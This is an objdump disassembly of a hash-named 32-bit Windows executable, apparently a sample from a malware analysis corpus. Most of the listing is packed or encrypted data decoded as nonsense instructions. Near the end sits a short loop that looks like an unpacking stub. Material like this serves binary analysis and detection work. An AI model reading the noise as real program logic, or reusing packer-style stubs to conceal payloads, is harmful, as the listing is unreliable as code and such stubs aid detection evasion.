
93195e33bf9ed68bd2b60febc2b344351ffad66d7f8fa9c877d51b1c2450cd06.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	mov    ecx,DWORD PTR [eax]
  4d0002:	mov    esi,0x3dd03736
  4d0007:	lods   eax,DWORD PTR ds:[esi]
  4d0008:	test   DWORD PTR [edx],ecx
  4d000a:	das    
  4d000b:	mov    ebp,0x719a4c5b
  4d0010:	mov    esp,0x39431489
  4d0015:	jbe    0x4d000c
  4d0017:	add    bl,BYTE PTR [eax]
  4d0019:	loop   0x4cffb5
  4d001b:	lea    edx,[edi+eiz*8]
  4d001e:	call   0x75baf056
  4d0023:	scas   al,BYTE PTR es:[edi]
  4d0024:	push   cs
  4d0025:	push   ss
  4d0026:	dec    edi
  4d0027:	inc    esi
  4d0028:	fcomi  st,st(7)
  4d002a:	mov    al,0xb9
  4d002c:	mov    BYTE PTR es:[ecx-0x1d223ba9],cl
  4d0033:	fld    TBYTE PTR [edi+0x50]
  4d0036:	adc    DWORD PTR [eax-0x40295002],0x6af45084
  4d0040:	fidiv  WORD PTR [ebx+ecx*1]
  4d0043:	ins    BYTE PTR es:[edi],dx
  4d0044:	scas   al,BYTE PTR es:[edi]
  4d0045:	mov    ds:0xdd8fd6f8,eax
  4d004a:	jg     0x4d00c5
  4d004c:	jb     0x4cfff0
  4d004e:	test   BYTE PTR [esi+0x6c638905],al
  4d0054:	add    DWORD PTR [edi-0x64],esi
  4d0057:	lock mov edi,DWORD PTR [esi+0x1d]
  4d005b:	and    BYTE PTR [esi-0x7f],dh
  4d005e:	loop   0x4cffec
  4d0060:	jae    0x4d00d3
  4d0062:	and    BYTE PTR [ebx-0x72],dh
  4d0065:	pop    ss
  4d0066:	mov    DWORD PTR es:[ebp-0x22],edx
  4d006a:	inc    esp
  4d006b:	ficom  DWORD PTR [ebx+eiz*2]
  4d006e:	daa    
  4d006f:	xchg   edx,eax
  4d0070:	pop    esp
  4d0071:	add    eax,0x6b06d321
  4d0076:	xor    eax,DWORD PTR [eax+0x8d4eafa]
  4d007c:	or     eax,0x3a5f2b7f
  4d0081:	repz cmp DWORD PTR [esi],eax
  4d0084:	das    
  4d0085:	push   ebp
  4d0086:	sub    ebx,DWORD PTR [ebx+0x42]
  4d0089:	jmp    DWORD PTR [edi]
  4d008b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d008c:	adc    al,0x9
  4d008e:	popa   
  4d008f:	mov    ds:0x766379f1,al
  4d0094:	jp     0x4d005c
  4d0096:	add    al,0x8a
  4d0098:	xchg   edi,eax
  4d0099:	cmp    ebx,edi
  4d009b:	fisttp QWORD PTR [esi]
  4d009d:	int    0x4
  4d009f:	and    bl,BYTE PTR [ebp+0x33]
  4d00a2:	cli    
  4d00a3:	xor    esi,DWORD PTR [edi+edx*2-0x57132e02]
  4d00aa:	add    DWORD PTR [esi],ebp
  4d00ac:	gs in  al,0xb3
  4d00af:	mov    ds:0x174c1b95,al
  4d00b4:	adc    bl,ch
  4d00b6:	mov    bl,0xe8
  4d00b8:	in     al,0xb9
  4d00ba:	verr   WORD PTR [esi-0x47000fb5]
  4d00c1:	adc    dl,BYTE PTR [edi+0x51436d34]
  4d00c7:	lds    ebx,FWORD PTR [eax-0x5fdd5144]
  4d00cd:	dec    eax
  4d00ce:	push   ecx
  4d00cf:	fucomp st(4)
  4d00d1:	scas   eax,DWORD PTR es:[edi]
  4d00d2:	sbb    DWORD PTR [ebx],esp
  4d00d4:	jg     0x4d0126
  4d00d6:	in     eax,0x52
  4d00d8:	out    0x6,al
  4d00da:	sbb    al,BYTE PTR [ebx]
  4d00dc:	inc    ebx
  4d00dd:	test   BYTE PTR [ebx],dh
  4d00df:	sub    BYTE PTR gs:[eax+eiz*1-0xd],bh
  4d00e4:	fdivr  DWORD PTR [eax-0x6285a2fd]
  4d00ea:	push   ebx
  4d00eb:	mov    ds:0xb5048edc,al
  4d00f0:	and    al,0xc7
  4d00f2:	adc    esi,DWORD PTR [ebx]
  4d00f4:	push   es
  4d00f5:	cmp    al,0xec
  4d00f7:	int3   
  4d00f8:	xchg   BYTE PTR [edx],cl
  4d00fa:	push   eax
  4d00fb:	sar    BYTE PTR [edi-0x5],0x15
  4d00ff:	aaa    
  4d0100:	ret    0xea1a
  4d0103:	call   0x6f9bfcbc
  4d0108:	cmp    DWORD PTR [eax-0x3e],0xa7bbd81b
  4d010f:	call   0x17d545a5
  4d0114:	jo     0x4d00d0
  4d0116:	call   0x6d91e553
  4d011b:	xlat   BYTE PTR ds:[ebx]
  4d011c:	test   al,0x38
  4d011e:	(bad)  
  4d011f:	js     0x4d00ce
  4d0121:	xor    DWORD PTR ds:0x50cda7de,eax
  4d0127:	cs scas al,BYTE PTR es:[edi]
  4d0129:	pushf  
  4d012a:	mov    cl,0x28
  4d012c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d012d:	mov    ecx,0x41e6a6d9
  4d0132:	sbb    bh,dh
  4d0134:	jns    0x4d00f3
  4d0136:	cmp    ecx,DWORD PTR [esi]
  4d0138:	loopne 0x4d0107
  4d013a:	xchg   edx,eax
  4d013b:	cmc    
  4d013c:	push   0x6e
  4d013e:	cli    
  4d013f:	sub    DWORD PTR [edi+0x619c5d1c],0xffffff9a
  4d0146:	in     al,0x77
  4d0148:	mov    ds:0xa73f2b5d,eax
  4d014d:	test   al,0x34
  4d014f:	dec    esp
  4d0150:	mov    eax,ds:0xd474506b
  4d0155:	aad    0x3a
  4d0157:	shl    DWORD PTR ds:0x6a185af,cl
  4d015d:	cmp    DWORD PTR [ebx+eiz*2],ecx
  4d0160:	sti    
  4d0161:	(bad)  
  4d0162:	jle    0x4d01c9
  4d0164:	xchg   ecx,eax
  4d0165:	and    BYTE PTR [ebp+0x5a81e582],0x7d
  4d016c:	pop    ds
  4d016d:	cmc    
  4d016e:	mov    ecx,0xd11b5981
  4d0173:	std    
  4d0174:	mov    ah,0xe7
  4d0176:	sub    DWORD PTR [esi-0x63],ebx
  4d0179:	mov    ds:0xadb4f4aa,eax
  4d017e:	lods   al,BYTE PTR ds:[esi]
  4d017f:	pop    esp
  4d0180:	lahf   
  4d0181:	mov    esp,0x42b9f457
  4d0186:	(bad)  
  4d0187:	pop    ss
  4d0188:	mov    eax,ds:0x533fc1f0
  4d018d:	mov    edx,0x39794b9d
  4d0192:	pop    es
  4d0193:	mov    ah,0xdd
  4d0195:	rcl    BYTE PTR [eax-0x53],cl
  4d0198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0199:	hlt    
  4d019a:	xlat   BYTE PTR ds:[ebx]
  4d019b:	xor    al,0xb
  4d019d:	hlt    
  4d019e:	xor    ecx,esp
  4d01a0:	test   BYTE PTR [ebx],0xb4
  4d01a3:	mov    ch,0xb
  4d01a5:	hlt    
  4d01a6:	dec    ebx
  4d01a7:	mov    ds:0x5df40c5e,al
  4d01ac:	mov    ds:0xb40a81f2,eax
  4d01b1:	cwde   
  4d01b2:	jns    0x4d0135
  4d01b4:	cmp    eax,0xc4829150
  4d01b9:	scas   eax,DWORD PTR es:[edi]
  4d01ba:	sar    BYTE PTR [edx+esi*2-0x80],cl
  4d01be:	sub    eax,0x5dd78f83
  4d01c3:	mov    ebp,0x4ee2b37e
  4d01c8:	mov    esp,0x492535a4
  4d01cd:	out    0xca,al
  4d01cf:	lds    ebp,FWORD PTR [edi+0x555e41a5]
  4d01d5:	mov    ds:0x851d2cfa,eax
  4d01da:	or     dl,cl
  4d01dc:	ins    DWORD PTR es:[edi],dx
  4d01dd:	repz movsx eax,WORD PTR [ecx+ebp*1]
  4d01e2:	push   esi
  4d01e3:	cmp    BYTE PTR [esi],bh
  4d01e5:	in     eax,dx
  4d01e6:	test   eax,0xba1f38e7
  4d01eb:	mov    ecx,0x4645e0e1
  4d01f0:	stos   DWORD PTR es:[edi],eax
  4d01f1:	pop    edi
  4d01f2:	jmp    0x4713:0x14a8ce42
  4d01f9:	aas    
  4d01fa:	(bad)  
  4d01fb:	out    dx,eax
  4d01fc:	mov    edx,0x9fd9fac0
  4d0201:	enter  0x4a79,0x7e
  4d0205:	cwde   
  4d0206:	(bad)  
  4d0207:	popf   
  4d0208:	shr    BYTE PTR [ebx+0x29],0x62
  4d020c:	cdq    
  4d020d:	adc    eax,0xec68f64f
  4d0212:	mov    al,0x9
  4d0214:	push   cs
  4d0215:	and    ebx,edx
  4d0217:	cli    
  4d0218:	pop    ss
  4d0219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d021a:	sub    ch,BYTE PTR [ecx]
  4d021c:	jmp    0x4f19:0x16d6d55b
  4d0223:	sub    eax,0x96711a3b
  4d0228:	es jno 0x4d01ad
  4d022b:	ins    DWORD PTR es:[edi],dx
  4d022c:	push   ecx
  4d022d:	retf   
  4d022e:	or     BYTE PTR [ecx+0x30],cl
  4d0231:	xor    eax,0xc156b6f7
  4d0236:	jge    0x4d01f4
  4d0238:	scas   al,BYTE PTR es:[edi]
  4d0239:	xor    DWORD PTR [esi],ecx
  4d023b:	ret    0x535f
  4d023e:	icebp  
  4d023f:	mov    dl,0xc
  4d0241:	mov    al,0x9
  4d0243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0244:	hlt    
  4d0245:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0246:	cli    
  4d0247:	(bad)  
  4d0249:	iret   
  4d024a:	or     DWORD PTR [edi+0x33],esi
  4d024d:	xchg   dh,dh
  4d024f:	fsub   DWORD PTR [eax*1-0x121fc880]
  4d0256:	or     eax,edi
  4d0258:	into   
  4d0259:	xchg   edi,eax
  4d025a:	mov    ah,0xae
  4d025c:	cs xchg esp,eax
  4d025e:	inc    edx
  4d025f:	frstor [ecx-0x4b8cf136]
  4d0265:	lahf   
  4d0266:	cmc    
  4d0267:	frstor [edi+ebx*2+0x2bb32e60]
  4d026e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d026f:	push   esi
  4d0270:	push   cs
  4d0271:	gs jmp 0xcbff:0xa2ab3934
  4d0279:	stos   DWORD PTR es:[edi],eax
  4d027a:	or     al,BYTE PTR [esi+0x2310c8f6]
  4d0280:	or     esi,DWORD PTR [edi]
  4d0282:	out    dx,eax
  4d0283:	pop    esp
  4d0284:	imul   ecx,ebp,0xffffff9d
  4d0287:	out    0x99,eax
  4d0289:	xor    al,0x87
  4d028b:	pop    ss
  4d028c:	addr16 retf 
  4d028e:	clc    
  4d028f:	cmp    BYTE PTR [ecx+0x67db2ba9],bl
  4d0295:	lods   al,BYTE PTR ds:[esi]
  4d0296:	fmul   st(7),st
  4d0298:	test   DWORD PTR [ebx+eax*4],esi
  4d029b:	mov    ss,esp
  4d029d:	and    al,0xd1
  4d029f:	sar    DWORD PTR [esi+0x32],0x2e
  4d02a3:	xchg   esp,eax
  4d02a4:	(bad)  
  4d02a5:	and    eax,0xc5863255
  4d02aa:	cmp    ch,BYTE PTR [edi]
  4d02ac:	ds fwait
  4d02ae:	push   eax
  4d02af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02b0:	dec    esi
  4d02b1:	push   edi
  4d02b2:	mov    bl,0xd1
  4d02b4:	out    dx,eax
  4d02b5:	shl    DWORD PTR [edx+0x6cfe9762],cl
  4d02bb:	and    edi,edi
  4d02bd:	add    DWORD PTR [ebx+0x118c8dde],edx
  4d02c3:	and    dh,BYTE PTR [ebx+esi*2+0x79]
  4d02c7:	xchg   esp,eax
  4d02c8:	sub    eax,0x596b868d
  4d02cd:	imul   ecx,DWORD PTR [ecx+0x76972918],0x375bdbe7
  4d02d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02d8:	push   ds
  4d02d9:	test   al,0xc3
  4d02db:	lods   al,BYTE PTR ds:[esi]
  4d02dc:	outs   dx,BYTE PTR ds:[esi]
  4d02dd:	sbb    al,0x8d
  4d02df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02e0:	in     eax,0x33
  4d02e2:	fstp   QWORD PTR [edi-0x7c]
  4d02e5:	int3   
  4d02e6:	xor    ah,BYTE PTR [eax+0x48508a7d]
  4d02ec:	mov    ch,al
  4d02ee:	sbb    DWORD PTR [ecx+eiz*8+0x2043f63a],edi
  4d02f5:	sbb    al,0x8b
  4d02f7:	rol    BYTE PTR ds:0xfc3f84e4,0x1a
  4d02fe:	ror    esp,1
  4d0300:	add    al,0x3b
  4d0302:	cmp    ecx,DWORD PTR [ebp+0x3af07256]
  4d0308:	cld    
  4d0309:	sbb    al,bl
  4d030b:	xchg   esi,eax
  4d030c:	out    dx,al
  4d030d:	push   0x11
  4d030f:	outs   dx,BYTE PTR ds:[esi]
  4d0310:	inc    esi
  4d0311:	push   ebp
  4d0312:	push   ebp
  4d0313:	aas    
  4d0314:	and    DWORD PTR [ebx+ebp*4-0x10],edx
  4d0318:	push   esp
  4d0319:	mov    ah,0x79
  4d031b:	push   cs
  4d031c:	mov    esp,0x59f2864b
  4d0321:	mov    ebx,0xd201fc5b
  4d0326:	call   0x69cc0752
  4d032b:	sub    ah,bh
  4d032d:	mov    cl,0xfe
  4d032f:	xlat   BYTE PTR ds:[ebx]
  4d0330:	adc    eax,0x6f7f014e
  4d0335:	call   0x2f64:0x9691d103
  4d033c:	sub    BYTE PTR [ecx-0x65],0x27
  4d0340:	add    bl,BYTE PTR [ebx+0x650fd888]
  4d0346:	ja     0x4d036e
  4d0348:	inc    edi
  4d0349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d034a:	xchg   DWORD PTR [edi],ebp
  4d034c:	(bad)  
  4d034d:	mov    dl,0xd1
  4d034f:	sub    BYTE PTR [ebx-0x10b3082e],dl
  4d0355:	mov    cs,ebx
  4d0357:	adc    edi,ebp
  4d0359:	js     0x4d033c
  4d035b:	into   
  4d035c:	add    DWORD PTR ds:0x76c33453,edx
  4d0362:	xchg   ebp,eax
  4d0363:	push   edi
  4d0364:	xor    DWORD PTR [ebx+0x7b],eax
  4d0367:	test   al,0xd0
  4d0369:	mov    esp,0x4330436c
  4d036e:	xchg   ebx,eax
  4d036f:	jbe    0x4d0361
  4d0371:	mov    esp,0x24f9896c
  4d0376:	xchg   ebx,eax
  4d0377:	jbe    0x4d0380
  4d0379:	xor    ah,BYTE PTR [esi]
  4d037b:	xchg   ecx,eax
  4d037c:	cli    
  4d037d:	int    0xd9
  4d037f:	push   esi
  4d0380:	fnsave [ecx]
  4d0382:	es test eax,0x8b659eaf
  4d0388:	jbe    0x4d03a4
  4d038a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d038b:	je     0x4d0318
  4d038d:	in     eax,0x43
  4d038f:	push   ebx
  4d0390:	jne    0x4d03ac
  4d0392:	mov    esp,0xe718a38
  4d0397:	mov    al,0x35
  4d0399:	mov    ?,ecx
  4d039b:	dec    edi
  4d039c:	push   DWORD PTR [ecx]
  4d039e:	pop    edi
  4d039f:	jno    0x4d036b
  4d03a1:	aad    0x61
  4d03a3:	xchg   ebx,eax
  4d03a4:	pop    ebx
  4d03a5:	aaa    
  4d03a6:	lahf   
  4d03a7:	jo     0x4d0373
  4d03a9:	je     0x4d0390
  4d03ab:	dec    edi
  4d03ac:	lods   al,BYTE PTR ds:[esi]
  4d03ad:	jl     0x4d0422
  4d03af:	cmp    ecx,DWORD PTR [edi+edi*4+0x51]
  4d03b3:	cmp    DWORD PTR [eax-0x2b5bdc76],edi
  4d03b9:	test   eax,0x56371500
  4d03be:	(bad)  
  4d03bf:	jmp    0xd04e:0x15003fb2
  4d03c6:	mov    dh,0xf7
  4d03c8:	or     DWORD PTR [esi+0x7200c19a],ecx
  4d03ce:	gs ds jmp 0x180e9de8
  4d03d5:	inc    esi
  4d03d6:	dec    esi
  4d03d7:	mov    esi,0xcbb1b9e9
  4d03dc:	mov    WORD PTR [edx+0x6a],gs
  4d03df:	xchg   ebp,eax
  4d03e0:	cmp    bh,ah
  4d03e2:	push   esi
  4d03e3:	push   ebx
  4d03e4:	out    0xd1,al
  4d03e6:	leave  
  4d03e7:	lods   al,BYTE PTR ds:[esi]
  4d03e8:	sbb    ebp,DWORD PTR [esi]
  4d03ea:	jle    0x4d03b3
  4d03ec:	push   ss
  4d03ed:	mov    eax,DWORD PTR [eax+edi*1+0x3bc374eb]
  4d03f4:	ds inc esp
  4d03f6:	pop    ebp
  4d03f7:	(bad)
  4d03fb:	scas   eax,DWORD PTR es:[edi]
  4d03fc:	pop    esi
  4d03fd:	std    
  4d03fe:	sbb    DWORD PTR [eax-0x5d],edx
  4d0401:	add    ch,BYTE PTR [esi]
  4d0403:	and    al,0x76
  4d0405:	mov    dh,0x12
  4d0407:	fmul   QWORD PTR [ebx-0x7967cab7]
  4d040d:	outs   dx,DWORD PTR ds:[esi]
  4d040e:	iret   
  4d040f:	addr16 jnp 0x4d03a2
  4d0412:	js     0x4d0420
  4d0414:	mov    gs,WORD PTR [eax]
  4d0416:	enter  0x73f3,0xd7
  4d041a:	jg     0x4d039c
  4d041c:	mov    ?,WORD PTR [ebx-0x52c926bf]
  4d0422:	dec    ecx
  4d0423:	jl     0x4d0460
  4d0425:	aam    0xa8
  4d0427:	adc    eax,0x75cf71b0
  4d042c:	sahf   
  4d042d:	idiv   BYTE PTR [ebx-0x63791978]
  4d0433:	ja     0x4d03c4
  4d0435:	jl     0x4d049b
  4d0437:	std    
  4d0438:	retf   0xe10e
  4d043b:	bound  edi,QWORD PTR [ecx+esi*4-0x6b314d6d]
  4d0442:	test   al,0x9f
  4d0444:	in     eax,dx
  4d0445:	outs   dx,DWORD PTR ds:[esi]
  4d0446:	push   edi
  4d0447:	pusha  
  4d0448:	adc    al,0x78
  4d044a:	dec    esi
  4d044b:	mov    eax,ds:0x620b87ed
  4d0450:	add    al,0x7c
  4d0452:	in     al,dx
  4d0453:	leave  
  4d0454:	lds    edi,FWORD PTR [edi+0x4db18e88]
  4d045a:	jp     0x4d0442
  4d045c:	lods   al,BYTE PTR ds:[esi]
  4d045d:	mov    ch,0x2
  4d045f:	jbe    0x4d03e1
  4d0461:	xchg   edi,eax
  4d0462:	pop    ecx
  4d0463:	cmovp  ebx,ebp
  4d0466:	mov    cl,0x9d
  4d0468:	pop    es
  4d0469:	push   esi
  4d046a:	adc    BYTE PTR [ebp+0x46d92da5],bh
  4d0470:	ds mov dh,0x88
  4d0473:	jl     0x4d0498
  4d0475:	int    0xf4
  4d0477:	iret   
  4d0478:	fisub  WORD PTR [esi+0x5932181d]
  4d047e:	loop   0x4d0467
  4d0480:	pop    edx
  4d0481:	and    al,0x72
  4d0483:	popf   
  4d0484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0485:	push   eax
  4d0486:	xchg   esp,eax
  4d0487:	or     eax,0xf26c5343
  4d048c:	mov    esi,0x426e570d
  4d0491:	dec    eax
  4d0492:	in     eax,0x1c
  4d0494:	xchg   edi,eax
  4d0495:	inc    ebx
  4d0496:	nop
  4d0497:	das    
  4d0498:	cmc    
  4d0499:	add    eax,eax
  4d049b:	and    BYTE PTR [esi+eiz*2+0x40],bl
  4d049f:	fbstp  TBYTE PTR [ecx-0x5adfed67]
  4d04a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d04a6:	inc    esi
  4d04a7:	xor    bh,ah
  4d04a9:	push   ecx
  4d04aa:	lods   eax,DWORD PTR ds:[esi]
  4d04ab:	je     0x4d04af
  4d04ad:	out    0x52,eax
  4d04af:	mov    edi,edi
  4d04b1:	pusha  
  4d04b2:	ss mov ecx,0x3f54bf26
  4d04b8:	push   0x99c5684d
  4d04bd:	mov    dl,0x97
  4d04bf:	sahf   
  4d04c0:	or     DWORD PTR [esi+0x68],esp
  4d04c3:	popa   
  4d04c4:	clc    
  4d04c5:	and    al,0x8
  4d04c7:	retf   
  4d04c8:	pop    edx
  4d04c9:	inc    ebx
  4d04ca:	clc    
  4d04cb:	xor    al,0xb3
  4d04cd:	mov    esp,0x83a3ca5a
  4d04d2:	xor    al,BYTE PTR [edx+0x16]
  4d04d5:	or     al,0xcf
  4d04d7:	or     eax,0xeabcc376
  4d04dc:	jle    0x4d04c0
  4d04de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04df:	mov    dh,0x9b
  4d04e1:	sbb    eax,0x22f54958
  4d04e6:	aam    0x17
  4d04e8:	iret   
  4d04e9:	cmp    eax,0xc452d4ad
  4d04ee:	push   edx
  4d04ef:	sub    edx,DWORD PTR [edi]
  4d04f1:	pusha  
  4d04f2:	scas   eax,DWORD PTR es:[edi]
  4d04f3:	aam    0xea
  4d04f5:	rol    BYTE PTR [esi-0x6a],cl
  4d04f8:	pop    ss
  4d04f9:	xchg   edi,eax
  4d04fa:	shr    DWORD PTR [eax+0x3f],0x85
  4d04fe:	leave  
  4d04ff:	outs   dx,DWORD PTR ds:[esi]
  4d0500:	push   ss
  4d0501:	into   
  4d0502:	xor    eax,0xebd1fe6
  4d0507:	inc    BYTE PTR ds:[ebp+0x31]
  4d050b:	dec    BYTE PTR [esi+0x73028f3a]
  4d0511:	(bad)
  4d0514:	add    bh,BYTE PTR [eax+edx*2]
  4d0517:	xchg   esi,eax
  4d0518:	push   edx
  4d0519:	ret    
  4d051a:	add    eax,0x6ffd34a2
  4d051f:	inc    ebx
  4d0520:	and    BYTE PTR [edx],al
  4d0522:	out    0xd4,al
  4d0524:	(bad)
  4d0529:	cmp    eax,0xde86474a
  4d052e:	push   ss
  4d052f:	jl     0x4d050c
  4d0531:	mov    DWORD PTR [ebp-0x10],edx
  4d0534:	es jbe 0x4d0549
  4d0537:	or     BYTE PTR [edi-0x48],0x51
  4d053b:	out    0x1f,al
  4d053d:	mov    ebx,0x44367d24
  4d0542:	xor    DWORD PTR [edi-0x7ebb83b0],eax
  4d0548:	add    eax,0x817f1183
  4d054d:	cmp    eax,0xc2eace63
  4d0552:	add    al,0x9b
  4d0554:	test   DWORD PTR [ecx-0x3a1d329f],esi
  4d055a:	push   cs
  4d055b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d055c:	jae    0x4d04e8
  4d055e:	lock mov al,0x96
  4d0561:	clc    
  4d0562:	rcr    DWORD PTR [ebx-0xa],cl
  4d0565:	idiv   DWORD PTR [eax+edi*8+0x75]
  4d0569:	dec    eax
  4d056a:	in     eax,dx
  4d056b:	push   cs
  4d056c:	loop   0x4d0524
  4d056e:	push   0xeb9977fd
  4d0573:	push   edx
  4d0574:	hlt    
  4d0575:	ins    DWORD PTR es:[edi],dx
  4d0576:	push   0xffffff95
  4d0578:	xor    edx,DWORD PTR [edx-0x55a6956b]
  4d057e:	mov    ss,WORD PTR [esi]
  4d0580:	outs   dx,DWORD PTR ds:[esi]
  4d0581:	push   0x192e971
  4d0586:	xchg   esi,eax
  4d0587:	outs   dx,DWORD PTR ds:[esi]
  4d0588:	bound  esp,QWORD PTR [ebx+0x8651bb1]
  4d058e:	fsub   QWORD PTR [edx-0x6b]
  4d0591:	test   al,0x8c
  4d0593:	inc    edi
  4d0594:	les    eax,FWORD PTR [edx]
  4d0596:	and    al,0x7c
  4d0598:	out    0xfc,eax
  4d059a:	xor    DWORD PTR [eax+0x7c928672],edx
  4d05a0:	lock cmp al,0xc6
  4d05a3:	and    cl,0x18
  4d05a6:	and    bl,BYTE PTR [eax+eiz*1]
  4d05a9:	out    0xdd,eax
  4d05ab:	inc    eax
  4d05ac:	outs   dx,BYTE PTR ds:[esi]
  4d05ad:	pop    esi
  4d05ae:	xchg   edx,eax
  4d05af:	inc    edx
  4d05b0:	push   ebx
  4d05b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d05b2:	test   BYTE PTR [ecx],0xd2
  4d05b5:	imul   esp,DWORD PTR [esi-0x2],0x199962f
  4d05bc:	shr    BYTE PTR [ecx-0x32],cl
  4d05bf:	(bad)  
  4d05c0:	das    
  4d05c1:	xchg   esi,eax
  4d05c2:	xor    esp,eax
  4d05c4:	cmp    BYTE PTR [ebp-0x4f7c5d3c],bl
  4d05ca:	xchg   ebp,eax
  4d05cb:	ret    
  4d05cc:	sub    esi,DWORD PTR [esi+0x524a0c9d]
  4d05d2:	jecxz  0x4d05b5
  4d05d4:	mov    ecx,0x331e1cbd
  4d05d9:	xor    BYTE PTR [ecx+0x40],dh
  4d05dc:	int3   
  4d05dd:	push   esp
  4d05de:	mov    ?,WORD PTR ds:0x4e83726
  4d05e4:	inc    ecx
  4d05e5:	sub    DWORD PTR [eax+0x40],0x4d
  4d05e9:	mov    cl,0xb5
  4d05eb:	and    eax,0xaa7db561
  4d05f0:	adc    eax,0x1fa7462b
  4d05f5:	sahf   
  4d05f6:	sti    
  4d05f7:	and    DWORD PTR [edx+ebx*8+0x105ff008],0xffffffef
  4d05ff:	inc    ebx
  4d0600:	(bad)  
  4d0602:	rcr    BYTE PTR [esi-0x130f9965],cl
  4d0608:	jecxz  0x4d060b
  4d060a:	jp     0x4d0623
  4d060c:	xchg   dh,bh
  4d060e:	xchg   ebp,eax
  4d060f:	call   0x18215e8f
  4d0614:	test   ebp,edi
  4d0616:	cmp    esi,DWORD PTR [ebx+0x6c]
  4d0619:	test   BYTE PTR [eax+0x4f7b9691],dh
  4d061f:	stc    
  4d0620:	addr16 in eax,dx
  4d0622:	mov    ah,0x7
  4d0624:	call   0x7e43:0x664ba212
  4d062b:	push   ds
  4d062c:	fwait
  4d062d:	and    al,0x2
  4d062f:	loop   0x4d0697
  4d0631:	(bad)  [edi+0x21]
  4d0634:	add    eax,0x64e00225
  4d0639:	(bad)  
  4d063b:	pop    ds
  4d063c:	sbb    eax,0x836017c
  4d0641:	add    eax,0xfafacec3
  4d0646:	cmp    al,0xf4
  4d0648:	xchg   edi,eax
  4d0649:	pop    ebp
  4d064a:	ret    0x65dc
  4d064d:	ja     0x4d062f
  4d064f:	test   BYTE PTR [esi],ah
  4d0651:	lds    esp,FWORD PTR [ebx]
  4d0653:	enter  0xf328,0x8b
  4d0657:	add    al,0xb6
  4d0659:	dec    eax
  4d065a:	or     eax,0x3b436b82
  4d065f:	loopne 0x4d06d8
  4d0661:	das    
  4d0662:	sahf   
  4d0663:	cmp    ebp,DWORD PTR [edx-0x73]
  4d0666:	inc    eax
  4d0667:	xor    DWORD PTR [edx],esi
  4d0669:	and    DWORD PTR [ebx+eiz*4-0x71],ebx
  4d066d:	add    ch,ch
  4d066f:	clc    
  4d0670:	dec    edx
  4d0671:	imul   eax,eax,0x1e
  4d0674:	mov    ch,0x5e
  4d0676:	jmp    0x77c2:0xb00d9266
  4d067d:	jne    0x4d06da
  4d067f:	in     al,0x43
  4d0681:	jno    0x4d063e
  4d0683:	sbb    al,0xfe
  4d0685:	stos   BYTE PTR es:[edi],al
  4d0686:	inc    ebp
  4d0687:	outs   dx,BYTE PTR ds:[esi]
  4d0688:	mov    esi,0xd0599c9d
  4d068d:	and    eax,eax
  4d068f:	int3   
  4d0690:	xor    esi,DWORD PTR [ecx+0x7f]
  4d0693:	jmp    0x7133:0x15808ece
  4d069a:	jg     0x4d0686
  4d069c:	into   
  4d069d:	mov    es,WORD PTR [eax+0x7f713315]
  4d06a3:	jmp    0x7133:0x15808ece
  4d06aa:	jg     0x4d0696
  4d06ac:	into   
  4d06ad:	mov    es,WORD PTR [eax+0x7fd23315]
  4d06b3:	jmp    0x7e33:0x158585ce
  4d06ba:	jp     0x4d06a6
  4d06bc:	push   edi
  4d06bd:	mov    ah,BYTE PTR [ebx+ecx*1-0x15]
  4d06c1:	mov    ds:0x2e80806,al
  4d06c6:	popf   
  4d06c7:	sub    dl,ah
  4d06c9:	retf   
  4d06ca:	mov    ds:0xccd4f425,al
  4d06cf:	fisttp QWORD PTR [ecx]
  4d06d1:	inc    ebp
  4d06d2:	jbe    0x4d0729
  4d06d4:	dec    ebp
  4d06d5:	push   edx
  4d06d6:	add    dh,BYTE PTR [ebx+0x369596da]
  4d06dc:	jne    0x4d06ac
  4d06de:	jo     0x4d071f
  4d06e0:	push   cs
  4d06e1:	jbe    0x4d069c
  4d06e3:	sbb    DWORD PTR [ecx],eax
  4d06e5:	imul   DWORD PTR es:[esi-0x32fed45e]
  4d06ec:	mov    edi,edi
  4d06ee:	push   ebp
  4d06ef:	mov    ebp,esp
  4d06f1:	sub    esp,0x58
  4d06f4:	lea    eax,ds:0x4d31dc
  4d06fa:	mov    DWORD PTR [ebp-0x58],0x27
  4d0701:	push   eax
  4d0702:	lea    ecx,[eax-0x1dc]
  4d0708:	push   ecx
  4d0709:	call   0x4d0c44
  4d070e:	add    esp,0x4
  4d0711:	test   eax,eax
  4d0713:	jne    0x4d0702
  4d0715:	pop    eax
  4d0716:	push   eax
  4d0717:	push   DWORD PTR [eax+0x1dc]
  4d071d:	push   ecx
  4d071e:	push   edx
  4d071f:	call   0x4d0ca0
  4d0724:	add    esp,0xc
  4d0727:	pop    eax
  4d0728:	push   eax
  4d0729:	mov    edi,0x0
  4d072e:	push   edi
  4d072f:	call   0x4d0740
  4d0734:	add    esp,0x4
  4d0737:	pop    eax
  4d0738:	add    esp,0x58
  4d073b:	pop    ebp
  4d073c:	ret    
  4d073d:	add    BYTE PTR [eax],al
  4d073f:	add    BYTE PTR [edi-0x1],bl
  4d0742:	adc    eax,0x4d2064
  4d0747:	call   edi
  4d0749:	add    BYTE PTR [eax],al
  4d074b:	add    BYTE PTR [edi-0x1],bl
  4d074e:	adc    eax,0x4d2038
  4d0753:	call   edi
  4d0755:	add    BYTE PTR [eax],al
  4d0757:	add    BYTE PTR [edi-0x1],bl
  4d075a:	adc    eax,0x4d20a0
  4d075f:	call   edi
  4d0761:	add    BYTE PTR [eax],al
